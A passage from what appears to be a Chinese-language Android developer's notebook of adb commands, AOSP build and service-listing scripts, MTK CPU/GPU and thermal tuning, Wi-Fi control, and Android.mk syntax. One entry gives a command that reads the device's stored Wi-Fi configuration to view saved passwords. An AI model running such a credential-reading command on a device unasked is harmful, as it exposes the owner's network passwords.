OUTPUT_FILE="packages-$(date "+%Y-%m-%d-%H-%M-%S"-ROM)"
mkdir $OUTPUT_FILE
tar -zcvf ${OUTPUT_FILE}.tar.gz $OUTPUT_FILE
```

## [CMD]  [docker] Ubuntu下映射串口设备到docker

```text
docker run --rm -it --device /dev/ttyUSB0:/dev/ttyS0 ubuntu:14.04 /bin/sh
 
注意：/dev/ttyUSB0 //Ubuntu下串口设备
     /dev/ttyS0   //Docker下串口设备
```

## [CMD] 重启framework命令

```text
adb shell stop && adb shell start
会出问题，引起屏幕显示异常?
源码位置:在 system/core/toolbox/start.c 下面,原理很简单就是利用ctl属性来控制进程
```

## [CMD] Android蓝牙adb调试命令

```text
注意：此命令只适用于broadcom 系列蓝牙芯片，例如RK903, AP6xxx 系列
 
1.第一种方式
# echo 1 > /sys/class/rfkill/rfkill0/state  //打开蓝牙
# echo 0 > /sys/class/rfkill/rfkill0/state  //关闭蓝牙
 
2.第二种方式
frameworks/base/services/core/java/com/android/server/BluetoothManagerService.java
private static final String SECURE_SETTINGS_BLUETOOTH_ADDRESS="bluetooth_address";
private static final String SECURE_SETTINGS_BLUETOOTH_NAME="bluetooth_name";
 
# settings get secure bluetooth_address //获取蓝牙Mac
# settings get secure bluetooth_name  //获取蓝牙名称
 
3.第三种方式
# service call bluetooth_manager 6 //打开蓝牙
# service call bluetooth_manager 8 //关闭蓝牙
 
//获取蓝牙mac地址
# service call bluetooth_manager 10 //对于Android 4.4.4
# service call bluetooth_manager 12// 适用于Android 5.0+


adb shell svc bluetooth enable
adb shell svc bluetooth disable

adb shell svc data enable
adb shell svc data disable
```

## [CMD] adb卸载系统应用

```text bash
adb shell pm uninstall -k --user 0 包名
```

## [CMD] iptables禁止访问某个域名

```text
1.禁止访问百度
# iptables -A OUTPUT -p tcp -d www.baidu.com --dport 80 -j DROP
# iptables -L //生效
 
2.允许访问百度
# iptables -A OUTPUT -p tcp -d www.baidu.com --dport 80 -j ACCEPT
# iptables -L
```

## [CMD] Android通用编译脚本

```text
#!/bin/bash
# usage: 
# ./build-common.sh TEST-AUDIO
# generate: packages-TEST-AUDIO-test-eng-master-2011-02-17-19-42-09.tar.gz

#OpenJDK 1.7 or OpenJDK 1.8;Need install OpenJDK 1.7 and OpenJDK 1.8 before.
export JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64  # OpenJDK 1.7
#export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 # OpenJDK 1.8
export JRE_HOME=${JAVA_HOME}/jre
export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
export PATH=${JAVA_HOME}/bin:${JRE_HOME}/bin:$PATH

ENG=test-eng
BRANCH=$(git symbolic-ref --short -q HEAD)

source build/envsetup.sh
lunch test-eng

# make update-api
make update-api -j$(grep -c processor /proc/cpuinfo)
# make all
make -j$(grep -c processor /proc/cpuinfo) 2>&1 | tee build_All.log
# make ota
make otapackage -j$(grep -c processor /proc/cpuinfo) 2>&1 | tee build_ota.log
 
#tar packages 
INPUT_FILE=out/target/product/msm8993
OUTPUT_FILE="packages-$1-$ENG-$BRANCH-$(date "+%Y-%m-%d-%H-%M-%S")"
mkdir $OUTPUT_FILE
 
cp $INPUT_FILE/boot.img      $OUTPUT_FILE
cp $INPUT_FILE/recovery.img  $OUTPUT_FILE
cp $INPUT_FILE/system.img    $OUTPUT_FILE
cp $INPUT_FILE/cache.img     $OUTPUT_FILE
cp $INPUT_FILE/userdata.img  $OUTPUT_FILE
cp $INPUT_FILE/persist.img   $OUTPUT_FILE
cp $INPUT_FILE/recover.img   $OUTPUT_FILE
 
tar -zcvf ${OUTPUT_FILE}.tar.gz $OUTPUT_FILE
rm -rf $OUTPUT_FILE
```

## [CMD] Android一个统计Service的脚本

```text
#!/bin/bash

function usage () {
  echo "usage: `basename $0` 'dir1 dir2 dir3' service-list-file"
  echo "     $ `basename $0` 'root system vendor' service.list"
}

if [ $# -ne 2 ] ; then
  usage
  exit 1
fi

DIRS=$1
SERVICE_LIST=$2

#echo "check android services in: $DIRS, and list in $SERVICE_LIST" 

# check_service input_file out_putfile

function check_service() {
  IFS_SAVE=$IFS
  IFS=''
  MODE=false

  DONE=false

  until $DONE
  do read -r LINE || DONE=true
  #while read -r LINE
  #do
    #echo "$LINE"
    # start with "service"
    if echo $LINE | grep -E '^service' > /dev/null 2>&1; then
      if [ x$MODE = "xfalse" ] ; then
        MODE=true
      else
        echo "" >> $2
      fi
      echo $LINE >> $2
    elif [ x$LINE = "x" ] ; then
      if [ x$MODE = "xtrue" ] ; then
        MODE=false
        echo "" >> $2
      fi
    # start with whitespace
    elif echo $LINE | grep -E '^[ \t] ' > /dev/null 2>&1; then
      if [ x$MODE = "xtrue" ] ; then
        echo $LINE >> $2
      else
        continue
      fi
    fi
  done < $1
  IFS=${IFS_SAVE}
}

if [ -e $SERVICE_LIST ] ; then
  rm -f $SERVICE_LIST
fi

for dir in $DIRS
do
  # get *.rc files list
  FILES=`find $dir -type f -iname "*.rc" 2>/dev/null | sort`

  for f in $FILES
  do
    echo $f

    # only check file contains "service"
    if grep -E '^service ' $f >/dev/null 2>&1; then
      # add file name
      echo "[$f] " >> $SERVICE_LIST

      # add service details
      #sed -n '/^service /,/^[^ ] /p' $f >> $SERVICE_LIST
      #echo "" >> $SERVICE_LIST

      check_service $f $SERVICE_LIST
    fi
  done
done

exit 0
```

## [CMD] 以调试模式启动程序

```text
adb shell am start -D -n com.example.mytestcm/.MainActivity
```

## [CMD] backup备份

```text
adb backup -nosystem -noshared -apk -f com.sina.weibo.ab com.sina.weibo
//-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -apk表示备份应用APK安装包 -f 表示备份的.ab文件路径和文件名,最后是要备份应用的packageName
```

## [CMD] 通过BAT脚本直接从apk文件获取包名和安装APK

```text
@echo off
::开启变量延迟，解决方法：开启变量延迟，并且变量要用一对叹号“!!”括起来。
setlocal enabledelayedexpansion
echo 开始...
set currentPath=.
set ApksPath="%currentPath%"
set ErrorLogFileName=%currentPath%\ParseApkErrorLog.txt
set ParselApksLogFile=%currentPath%\ParselApksLogFile.txt
 
::http://www.cnblogs.com/glaivelee/archive/2009/10/07/1578737.html
::https://blog.csdn.net/lys211/article/details/45698803
set /a var=1
 
for /f "delims=" %%i in ('dir /b /a -d %ApksPath%\*.apk') do (
 set apkName=%%i
 echo 正在解析第 !var! 个应用: !apkName!
 for /f "delims=" %%a in ( 'aapt d badging "%ApksPath%\%%i"^|findstr "package: "') do (
  ::echo %%a
  for /f "delims=' tokens=2" %%b in ( "%%a" ) do ( 
   ::echo %%b >> %ParselApksLogFile% 
   set packName=%%b
   ::echo %packName%
   echo 卸载旧客户端,包名:!packName!
   ::先将旧apk卸载，然后再安装新apk，如果没有这个会报一个提示，不影响下面的安装
   adb uninstall !packName!
   echo 正在安装：!apkName!
   ::安装新的apk 
   adb install !apkName!
  )
 )
 set /a var+=1
)
 
echo 完成
```

## [CMD] Android 只获取特定包名log

```text
adb logcat --pid=$(adb shell pidof -s pkg_name)
```

## [CMD] Android 根据包名查看进程id

```text
adb shell pidof -s com.android.settings
```

## [CMD] 查看wifi密码

```text
adb shell cat /data/misc/wifi/*.conf
```

## [CMD] 打开展讯YLog的命令

```text
adb shell am start -n com.sprd.engineermode/com.sprd.engineermode.debuglog.ylogui.YlogActivity
```

## [CMD] find

```text
导出代码中所有的语言资源文件
find ./ -name '*string*.xml' -or -name 'array*.xml' -or -name 'numeric_operator.xml' | xargs -i cp --parents -rf {} ./res_xml_all/

导出俄语的：
find <folder name>/ -regex ".*res\(_.*\)?\/values\(-\(ru\).*\)?\/.*\(string\|array\).*.xml" | xargs -I % cp --parents % <output folder> 

快速查找代码中的字符
find ./packages/apps/ -name "*.xml" | xargs grep --color "red"
```

## [CMD]  [log] adb logcat 只显示 D 等级的log

```text
adb logcat | grep " D "
```

## [CMD] busybox 如何使用??

```text
1、 BusyBox 的诞生 
BusyBox 最初是由 Bruce Perens 在 1996 年为 Debian GNU/Linux 安装盘编写的。其目标是在一张软盘上创建一个可引导的 GNU/Linux 系统，这可以用作安装盘和急救盘。 

2、busybox的用法 
可以这样用busybox 
#busybox ls 
他的功能就相当运行ls命令 
最常用的用法是建立指向busybox的链接,不同的链接名完成不同的功能. 
#ln -s busybox ls 
#ln -s busybox rm 
#ln -s busybox mkdir 
然后分别运行这三个链接: 
#./ls 
#./rm 
#./mkdir 
就可以分别完成了ls rm 和mkdir命令的功能.虽然他们都指向同一个可执行程序busybox，但是只要链接名不同,完成的功能就不同，很多linux网站都提供busybox的源代码下载。

3、配置busybox 
busybox的配置程序和linux内核菜单配置方式简直一模一样.熟悉用make menuconfig方式配置linux内核的朋友很容易上手. 
#cp busybox-1.00.tar.gz /babylinux 
#cd /babylinux 
#tar xvfz busybox-1.00.tar.gz 
#cd busybox-1.00 
#make menuconfig 
下面是需要编译进busybox的功能选项。 
General Configuration应该选的选项 
Show verbose applet usage messages 
Runtime SUID/SGID configuration via /etc/busybox.conf 
Build Options 
Build BusyBox as a static binary (no shared libs) 
这个选项是一定要选择的,这样才能把busybox编译成静态链接的可执行文件,运行时才独立于其他函数库.否则必需要其他库文件才能运行,在单一个linux内核不能使它正常工作. 
Installation Options 
Don't use /usr 
这个选项也一定要选,否则make install 后busybox将安装在原系统的/usr下,这将覆盖掉系统原有的命令.选择这个选项后,make install后会在busybox目录下生成一个叫_install的目录,里面有busybox和指向它的链接. 
其它选项都是一些linux基本命令选项,自己需要哪些命令就编译进去,一般用默认的就可以了，配置好后退出并保存。

4、编译并安装busybox 
#make 
#make install 
编译好后在busybox目录下生成子目录_install,里面的内容: 
drwxr-xr-x 2 root root 4096 11月 24 15:28 bin 
rwxrwxrwx 1 root root 11 11月 24 15:28 linuxrc -> bin/busybox 
drwxr-xr-x 2 root root 4096 11月 24 15:28 sbin 
其中可执行文件busybox在bin目录下,其他的都是指向他的符号链接. 
```

## [CMD] MTK Android常用的命令记录（CPU/GPU频率调整等）

```text
1 查看CPU频率
cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq
1050000
1050000
1050000
1050000
2 使用GPU Procfs接口查看设置频率等
1）查看当前频率
/ # cat /sys/kernel/debug/ged/hal/current_freqency
/ # cat /proc/gpufreq/gpufreq_var_dump
GPU current frequency = 299000KHz
Current Vcore = 1150mV
g_cur_gpu_OPPidx = 2
g_last_gpu_dvs_result = 127 (0:success, 127:not enabled, else:error)
g_limited_max_id = 0
mt_gpufreq_power_limited_index_array[0]  = 0
mt_gpufreq_power_limited_index_array[1]  = 0
mt_gpufreq_power_limited_index_array[2]  = 0
mt_gpufreq_power_limited_index_array[3]  = 0
mt_gpufreq_volt_enable_state = 0
mt_gpufreq_fixed_freq_state = 0
mt_gpufreq_dvfs_table_type = 2
mt_gpufreq_dvfs_mmpll_spd_bond = 5
# GPU可以开启GPU柱状图显示，使用命如下令进入原生设置界面
# am start -n com.android.settings/.Settings
# -->开发者选项-->GPU呈现模式分析-->在屏幕上显示为条形图
2）GPU固定频率等接口

/proc/mali # cat /proc/mali/help
======================================================================
A.For Query GPU/CPU related Command:
  cat /proc/mali/utilization
  cat /proc/mali/frequency
  cat /proc/mali/memory_usage
======================================================================
B.For Fix GPU Frequency:
  echo > (450000, 280000) /proc/gpufreq/gpufreq_opp_freq
  echo 0 > /proc/gpufreq/gpufreq_opp_freq(re-enable GPU DVFS)
C.For Turn On/Off CPU core number:
  echo (1, 0) > /sys/devices/system/cpu/cpu1/online
  echo (1, 0) > /sys/devices/system/cpu/cpu2/online
  echo (1, 0) > /sys/devices/system/cpu/cpuN/online
D.For CPU Performance mode(Force CPU to run at highest speed:
 echo performance > /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
 echo interactive > /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor(re-enable CPU DVFS)
==============================================================================================
E.For GPU advanced debugging command:
 echo [dvfs_freq(ms)]  > /proc/mali/dvfs_freq
 echo [dvfs_thr_max]  [dvfs_thr_min]  > /proc/mali/dvfs_threshold
 echo [dvfs_deferred_count]  > /proc/mali/dvfs_deferred_count
==============================================================================================
#方法1：
echo 520000 >gpufreq_fixed_freq
#方法2：
echo 1 >/proc/gpufreq/gpufreq_state
cat /proc/gpufreq/gpufreq_state
GPU DVFS disabled
echo 520000 >/proc/gpufreq/gpufreq_opp_freq
3) 查看GPU电压频率控制列表

/ # cat /proc/gpufreq/gpufreq_power_dump                                           <
mt_gpufreqs_power[0] .gpufreq_khz = 520000
mt_gpufreqs_power[0] .gpufreq_volt = 115000
mt_gpufreqs_power[0] .gpufreq_power = 828
mt_gpufreqs_power[1] .gpufreq_khz = 416000
mt_gpufreqs_power[1] .gpufreq_volt = 115000
mt_gpufreqs_power[1] .gpufreq_power = 662
mt_gpufreqs_power[2] .gpufreq_khz = 416000
mt_gpufreqs_power[2] .gpufreq_volt = 115000
mt_gpufreqs_power[2] .gpufreq_power = 662
mt_gpufreqs_power[3] .gpufreq_khz = 299000
mt_gpufreqs_power[3] .gpufreq_volt = 115000
mt_gpufreqs_power[3] .gpufreq_power = 475
mt_gpufreqs_power[4] .gpufreq_khz = 299000
mt_gpufreqs_power[4] .gpufreq_volt = 115000
mt_gpufreqs_power[4] .gpufreq_power = 475
mt_gpufreqs_power[5] .gpufreq_khz = 299000
mt_gpufreqs_power[5] .gpufreq_volt = 115000
mt_gpufreqs_power[5] .gpufreq_power = 475
4）其他sys目录下的gpu接口

/ # find /sys -name gpu*
/sys/devices/soc/13040000.gpu/gpuinfo
/sys/firmware/devicetree/base/soc/gpu@13040000
/sys/kernel/debug/mali0/gpu_memory
/sys/kernel/debug/ged/hal/gpu_utilization
/sys/kernel/debug/ged/logbufs/gpuinfo
/sys/kernel/debug/tracing/events/mtk_events/gpu_freq
/sys/module/ged/parameters/gpu_idle
/sys/module/ged/parameters/gpu_dvfs_enable
/sys/module/ged/parameters/gpu_block
/sys/module/ged/parameters/gpu_loading
/sys/module/ged/parameters/gpu_cust_boost_freq
/sys/module/ged/parameters/gpu_cust_upbound_freq
/sys/module/ged/parameters/gpu_debug_enable
/sys/module/ged/parameters/gpu_bottom_freq
3 温度监测
1）查看所有温度传感器的温度
/ # cat /sys/devices/virtual/thermal/thermal_zone*/temp
37000
48300
47100
48300
47700
47700
-127000
54985
38000

2）对应温度传感器的名称
/ # cat /sys/devices/virtual/thermal/thermal_zone*/type
mtktswmt              //wifi温度
mtktscpu              // CPU
mtkts1
mtkts5
mtkts3
mtkts4
mtktsbattery        //电池
mtktspmic           //电源管理芯片
mtktsAP

4）其他温度接口
/ # cat /proc/driver/thermal/tzpmic
[mtktspmic_read]  trip_0_temp=145000,trip_1_temp=110000,trip_2_temp=100000,trip_3_temp=90000,trip_4_temp=80000,
trip_5_temp=70000,trip_6_temp=65000,trip_7_temp=60000,trip_8_temp=55000,trip_9_temp=50000,
g_THERMAL_TRIP_0=0,g_THERMAL_TRIP_1=0,g_THERMAL_TRIP_2=0,g_THERMAL_TRIP_3=0,g_THERMAL_TRIP_4=0,
g_THERMAL_TRIP_5=0,g_THERMAL_TRIP_6=0,g_THERMAL_TRIP_7=0,g_THERMAL_TRIP_8=0,g_THERMAL_TRIP_9=0,
cooldev0=mtktspmic-sysrst,cooldev1=no-cooler,cooldev2=no-cooler,cooldev3=no-cooler,cooldev4=no-cooler,
cooldev5=no-cooler,cooldev6=no-cooler,cooldev7=no-cooler,cooldev8=no-cooler,cooldev9=no-cooler,time_ms=1000

/ # cat /proc/driver/thermal/tzcpu
[tscpu_read] 6
trip_0=117000 0 mtktscpu-sysrst                      //117度CPU会复位
trip_1=100000 0 mtk-cl-shutdown00               //100度关机
trip_2=95000 0 cpu02
trip_3=90000 0 cpu_adaptive_0
trip_4=76000 0 cpu_adaptive_1
trip_5=68000 0 cpu_adaptive_2
trip_6=45000 0 no-cooler
trip_7=35000 0 no-cooler
trip_8=25000 0 no-cooler
trip_9=15000 0 no-cooler
4 CPU调整性能模式
echo performance > /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
echo performance > /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor
echo performance > /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor
echo performance > /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor
```

## [CMD]  [log] 采集某个应用的内存数据

```text
# !/system/bin/sh
#这个脚步比较粗糙，是这么个意思
file=/sdcard/cpu/mem_info.log
rm $file
until [ 1 -gt 10000 ] 
do
echo -e "\n\n\n\n\n---------------">>$file
date >> $file
dumpsys meminfo com.tianxia.test >> $file
sleep 3
done
```

## [FAQ03739]  [CMD] 通过adb shell操作WIFI

```text
1   ICS2及以前版本
打开wifi：

#adb shell
#cd   /sys/class/rfkill/rfkill1/
#cat  type                #输出值如果为wlan，则直接下一步，否则进入rfkill0，然后执行下一步
#echo  1 > state

关闭wifi：
同理，如果wifi已经打开，关闭wifi使用命令：
#echo  0 > state

如果要执行具体的命令，比如扫描，连接等，那么就需要wpa_cli工具，但是该工具是建立在supplicant启动基础上的，而supplicant的执行又建立在wifi加载的基础上。

打开supplicant：

#adb shell
#cd system/bin/
#./wpa_supplicant -Dwext -iwlan0 -c/data/misc/wifi/wpa_supplicant.conf

(如果配置文件不在上述目录，请使用这个路径：/system/etc/wifi/wpa_supplicant.conf)
(上述命令执行后会阻塞在命令行，如果要执行其他命令，请另开一个命令行界面)
(判断wifi或者supplicant是否运行起来，可以通过ps命令查看是否有tx_thread和./wpa_supplicant进程)

运行wpa_cli:

#adb shell
#wpa_cli
(如果上面命令不成功，请执行：wpa_cli  -p  /data/misc/wpa_supplicant)

接着就可以执行各种命令了，可以使用h参数查看wpa_cli有哪些命令可用，
比如有scan，scan_results等

2 JB版本

1. 启动wifi driver
echo 1 > /dev/wmtWifi

2. 启动supplicant
cd  /system/bin
./wpa_supplicant  -iwlan0  -Dnl80211 -c/system/etc/wifi/wpa_supplicant.conf

3. 启动wpa_cli
cd  /system/bin
wpa_cli -p /data/misc/wpa_supplicant
启动以后可以通过help获得帮助信息。

3 JB2版本
1. 启动wifi driver
echo 1 > /dev/wmtWifi

2. 启动supplicant
cd  /system/bin
iwpriv wlan0 set_p2p_mode 0 0
iwpriv wlan0 set_p2p_mode 1 0
./wpa_supplicant -iwlan0 -Dnl80211 -c/data/misc/wifi/wpa_supplicant.conf -N -ip2p0 -Dnl80211 -c/data/misc/wifi/p2p_supplicant.conf

3. 启动wpa_cli
cd  /system/bin
wpa_cli -p /data/misc/wpa_supplicant
启动以后可以通过help获得帮助信息。

关于内容中的iwpriv工具，如何获取，可以参考：

ID: FAQ03969
如何自己编译wireless tool

关于wpa_cli下的连接AP的操作，可以参考：

ID: FAQ03738
通过wpa_cli连接一个AP
```

## [CMD]  [log]  [FAQ08885]  Activity和Broadcast行为不正常时，如何抓取log?

```text
1) 请使用mtklog抓取，保证有main log和event log产生
2) 对于activity行为不正常，请打开activity的log开关再抓取：
adb shell dumpsys activity log a on
这个命令只对当次开机有效

3) 对于broadcast行为不正常，请打开broadcast的log开关再抓取：
adb shell dumpsys activity log br on
这个命令只对当次开机有效

4) 请记录下问题发生时手机上的时间
```

## [CMD]  [FAQ12836]  如何用CMD 去开关AAL 各个子feature

```text
讨论的前提是ProjectConfig.mk 中的MTK_AAL_SUPPORT=yes
 
1. 参考AAL sub feature 开启状况：
adb shell dumpsys AAL --function
 
返回值：
bit 0 表示LABC enable(1)/Disable(0)
bit 1 表示CABC enable(1)/Disable(0)
bit 2 表示DRE enable(1)/Disable(0)
 
2. 如何enable/disable 各个sub feature
adb shell dumpsys AAL --function n  （建议CMD 多执行几次，确认生效）
n 描述跟上面的一样。
 
比如n=0 表示disable LABC/CABC/DRE
n=7 表示全部enable
```

## [CMD]  [FAQ14788]  如何用命令设置开发者选项中Enable OpenGL trace的各个选项?

```text
在手机的Settings->Developer options->Enable OpenGL traces这个选项中的值，可以直接进入手机界面去做设定。
但有时候需要使用命令行来设置，那么可以使用如下方法来做。
 
[SOLUTION] 
Enable OpenGL trace这个选项可以设定的值有3个：Logcat,Systrace(Graphics),Call stack on glGetError，
还有一个是默认选项：None(这个选项对应到property里面是没有值的，所以不可以通过setprop的方式去设置)
 
手机须先获取root权限后才可以设置，设置方法如下：
设定Logcat：adb shell setprop debug.egl.trace  1
设定Systrace：adb shell setprop debug.egl.trace systrace
设定glGetError：adb shell setprop debug.egl.trace  error
上述命令设置以后，接着需要如下两个命令来使得上述设置生效
adb shell  "stop;start"
 
注意：上述属性值设置完以后，永久生效(手机关机再开机依然保持不变)，若要恢复到默认值"None"，必须通过手机图形化界面去选择
 
通过如下命令check，做完上述设置以后是否生效：
adb shell getprop debug.egl.trace
```

## [CMD]  [FAQ18354]  [Legacy Wi-Fi] 非root权限下通过adb命令获取手机的MAC地址

```text
adb shell wpa_cli -iwlan0 -g@android:wpa_wlan0 IFNAME=wlan0 DRIVER MACADDR
```

## [CMD]  [FAQ20206]  如何使用adb command来设置cpu频率和核数

```text
透過ADB Shell設定CPU開核與freq的command與用法如下:
# Disable PPM
echo 0 > /proc/ppm/enabled
# Enable PPM (Default)
echo 1 > /proc/ppm/enabled
echo 0 > /proc/ppm/enabled
Fixed # Core for each cluster
echo X Y > /proc/ppm/policy/ut_fix_core_num Where,
X = -1, 0 ~ 4. Core# for cluster 0
Y = -1, 0 ~ 4. Core# fot cluster 1
echo 4 4 > /proc/ppm/policy/ut_fix_core_num

Fixed OPP for each cluster
echo X Y > /proc/ppm/policy/ut_fix_freq_idx Where,
X = -1, 0 ~ 15. OPP for cluster 0
Y = -1, 0 ~ 15. OPP for cluster 1
echo 1 2 > /proc/ppm/policy/ut_fix_freq_idx
範例:
echo 1 > /proc/ppm/enabled
echo 4 4 2 > /proc/ppm/policy/ut_fix_core_num   <= 開4小核 4大核 2最大核
echo 0 0 0 > /proc/ppm/policy/ut_fix_freq_idx    <小核用最高頻，大核用最高頻，最大核用最高頻

可以先從CPU最高效能全開來測試，然後逐步調降適當的設定
建議可以安裝附件的PerMon的APK，可以即時顯示CPU 的核數與freq在畫面上
可以用來確認CPU設定是否生效
若有確定較好的設定，就可以修改custom folder的設定
```

## [CMD]  [bootloader] android P UserDebug 软件 adb remount 失败的原因和解决方案

```text
在android P版本上如果按照“FAQ18076 android 6.0 M userdebug版本执行adb remount失败”的做法在userdebug版本上执行adb remount会提示以下错误：
remount of the / superblock failed: Permission denied
remount failed
原因是android P版本后google启用avb(Android Verified Boot)2.0，verified boot and DM-verity默认启用策略发生了变化。详情如下：
DM-Verity behavior changes from vboot1.0 to avb2.0.
On vboot1.0, dm-verity is turned off on eng build and is enabled on userdebug/user build.
DM-verity could be disabled with adb (not fastboot) on userdebug build without unlocking device first.
DM-Verity could not be disabled on user build.
On avb2.0, dm-verity behavior are the same on all build variants.
It's turned on by default and could only be disabled after device is unlocked.
dm-verity disable flag is moved from system image dm-verity metadata(vboot1.0) to vbmeta image(avb2.0), and you have two ways to disable it: adb and fastboot.

[SOLUTION] 
* Android P + kernel-4.4 or kernel-3.18
- download preloader with verified boot disabled which location is the same as scatter file //preloader_<PROJECT>_SBOOT_DIS.bin
- adb root
- adb disable-verity
- adb reboot
- adb root
- adb remount

* Android P + kernel-4.9 or after 
- download preloader with verified boot disabled which location is the same as scatter file. //preloader_<PROJECT>_SBOOT_DIS.bin
- boot to Home Screen
- go to setting -> system -> Developer options -> OEM unlocking
- adb reboot bootloader
- fastboot flashing unlock
- press volume up key
- fastboot reboot
- adb root
- adb disable-verity
- adb reboot
- adb root
- adb remount
 
After Android P, preloader_<PROJECT>_SBOOT_DIS.bin will be generated automatically after building preloader.
 
* 请注意下载最新的adb/fastboot tool
Windows
https://dl.google.com/android/repository/platform-tools-latest-windows.zip
Mac
https://dl.google.com/android/repository/platform-tools-latest-darwin.zip
Linux
https://dl.google.com/android/repository/platform-tools-latest-linux.zip
```

## [CMD] lint 命令行怎么使用?

```text
lint [flags]  <project directory>
gradlew lint

https://juejin.im/post/5d307615f265da1b6b1d0dd9
```

## [CMD]  [FAQ05446] 怎样快速拷贝及打包整个binary load（供下载）?

```text
在alps目录下：

mkdir new_load
cp -uvL out/target/product/YOUR_PROJ/* new_load/
tar zcvf new_load.tar.gz new_load
```text
#####################################################################################################
#####################################################################################################
########################################## CMD end ##################################################
#####################################################################################################
#####################################################################################################


## [知识点] android:duplicateParentState 属性详解

[android:duplicateParentState] (https://blog.csdn.net/sodino/article/details/8809778)

```text Java
setDuplicateParentStateEnabled(true)
```

#####################################################################################################
#####################################################################################################
########################################## make begin ###############################################
#####################################################################################################
#####################################################################################################

## [make] Android.mk语法

```text
首先来看一个简单的Android makefile,这个是我上篇文章写的，重新摘出来:
LOCAL_PATH:=$(call my-dir)       定义了当前模块的相对路径
include $(CLEAR_VARS)            清空了当前的环境变量
LOCAL_MODULE_TAGS := eng         指定模块在eng模式下才进行编译 
LOCAL_LDLIBS := -L$(SYSROOT)/usr/lib -llog   编译需要的库
LOCAL_SRC_FILES:=ppp.c           编译所需要的目标源文件，一般都是当前目录下，或者依赖于其它目录下
LOCAL_MODULE:= PPPreboot         编译生成该目标的名称，也就是最终的可执行文件
include $(BUILD_EXECUTABLE)         编译所生成的目标的文件格式 
其中:
my-dir在build/core/definitions.mk定义
CLEAR_VARS在build/core/config.mk定义 

以下就是我之前写的源码，简单的功能。

#include <stdio.h>  
#include <stdlib.h>  
#include <android/log.h>  
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, "keymatch", __VA_ARGS__)  
int main(void) {
    int i; 
    freopen("/dev/ttyMT0", "a", stdout);setbuf(stdout, NULL);
    freopen("/dev/ttyMT0", "a", stderr);setbuf(stderr, NULL);
    LOGD("YYX---->reboot system!!!!!!--->201612.1\n");
    system("reboot");
    return 0 ;
} 
makefile还有源码写完以后我们就可以进行编译了。
首先，需要source build/envsetup.sh  初始化参数和环境变量
接着lunch  对应的平台的版本

接着就拥有了mm、mmm等编译工具
然后对刚刚写的程序进行手动编译: mmm external/test/
```

## [make] Android.mk 文件的编写

```text
Android.mk的编译规则在 build/make/core 目录下的 mk 文件中
android编译系统的makefile文件Android.mk写法如下

(1)Android.mk文件首先需要指定LOCAL_PATH变量，用于查找源文件。由于一般情况下
Android.mk和需要编译的源文件在同一目录下，所以定义成如下形式：
LOCAL_PATH:=$(call my-dir)
上面的语句的意思是将LOCAL_PATH变量定义成本文件所在目录路径。

(2)Android.mk中可以定义多个编译模块，每个编译模块都是以include $(CLEAR_VARS)开始
以include $(BUILD_XXX)结束。
include $(CLEAR_VARS)
CLEAR_VARS由编译系统提供，指定让GNU MAKEFILE为你清除除LOCAL_PATH以外的所有LOCAL_XXX变量，
如LOCAL_MODULE，LOCAL_SRC_FILES，LOCAL_SHARED_LIBRARIES，LOCAL_STATIC_LIBRARIES等。
include $(BUILD_STATIC_LIBRARY)表示编译成静态库
include $(BUILD_SHARED_LIBRARY)表示编译成动态库。
include $(BUILD_EXECUTABLE)表示编译成可执行程序

(3)举例如下(frameworks/base/libs/audioflinger/Android.mk)：
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)  模块一
ifeq ($(AUDIO_POLICY_TEST),true)
    ENABLE_AUDIO_DUMP := true
endif
LOCAL_SRC_FILES := \
    AudioHardwareGeneric.cpp \
    AudioHardwareStub.cpp \
    AudioHardwareInterface.cpp
ifeq ($(ENABLE_AUDIO_DUMP),true)
  LOCAL_SRC_FILES += AudioDumpInterface.cpp
  LOCAL_CFLAGS += -DENABLE_AUDIO_DUMP
endif
LOCAL_SHARED_LIBRARIES := \
    libcutils \
    libutils \
    libbinder \
    libmedia \
    libhardware_legacy
ifeq ($(strip $(BOARD_USES_GENERIC_AUDIO)),true)
  LOCAL_CFLAGS += -DGENERIC_AUDIO
endif
LOCAL_MODULE:= libaudiointerface
ifeq ($(BOARD_HAVE_BLUETOOTH),true)
  LOCAL_SRC_FILES += A2dpAudioInterface.cpp
  LOCAL_SHARED_LIBRARIES += liba2dp
  LOCAL_CFLAGS += -DWITH_BLUETOOTH -DWITH_A2DP
  LOCAL_C_INCLUDES += $(call include-path-for, bluez)
endif
include $(BUILD_STATIC_LIBRARY)  模块一编译成静态库
include $(CLEAR_VARS)  模块二
LOCAL_SRC_FILES:=               \
    AudioPolicyManagerBase.cpp
LOCAL_SHARED_LIBRARIES := \
    libcutils \
    libutils \
    libmedia
ifeq ($(TARGET_SIMULATOR),true)
 LOCAL_LDLIBS += -ldl
else
 LOCAL_SHARED_LIBRARIES += libdl
endif
LOCAL_MODULE:= libaudiopolicybase
ifeq ($(BOARD_HAVE_BLUETOOTH),true)
  LOCAL_CFLAGS += -DWITH_A2DP
endif
ifeq ($(AUDIO_POLICY_TEST),true)
  LOCAL_CFLAGS += -DAUDIO_POLICY_TEST
endif
include $(BUILD_STATIC_LIBRARY) 模块二编译成静态库
include $(CLEAR_VARS) 模块三
LOCAL_SRC_FILES:=               \
    AudioFlinger.cpp            \
    AudioMixer.cpp.arm          \
    AudioResampler.cpp.arm      \
    AudioResamplerSinc.cpp.arm  \
    AudioResamplerCubic.cpp.arm \
    AudioPolicyService.cpp
LOCAL_SHARED_LIBRARIES := \
    libcutils \
    libutils \
    libbinder \
    libmedia \
    libhardware_legacy
ifeq ($(strip $(BOARD_USES_GENERIC_AUDIO)),true)
  LOCAL_STATIC_LIBRARIES += libaudiointerface libaudiopolicybase
  LOCAL_CFLAGS += -DGENERIC_AUDIO
else
  LOCAL_SHARED_LIBRARIES += libaudio libaudiopolicy
endif
ifeq ($(TARGET_SIMULATOR),true)
 LOCAL_LDLIBS += -ldl
else
 LOCAL_SHARED_LIBRARIES += libdl
endif
LOCAL_MODULE:= libaudioflinger
